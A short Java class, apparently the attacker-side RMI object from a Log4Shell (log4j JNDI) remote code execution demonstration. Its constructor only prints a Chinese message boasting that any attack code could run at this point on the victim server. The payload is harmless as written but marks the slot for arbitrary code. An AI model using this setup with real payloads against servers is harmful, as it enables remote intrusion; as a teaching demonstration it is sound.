package com.dyz.log4j.bug.back.hacker.logic;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class Attack extends UnicastRemoteObject {

    public Attack() throws RemoteException {
        super();
        System.out.println("当你在服务端看到这句话，就意味着我可以在这里放任何攻击你的代码！");

    }
}
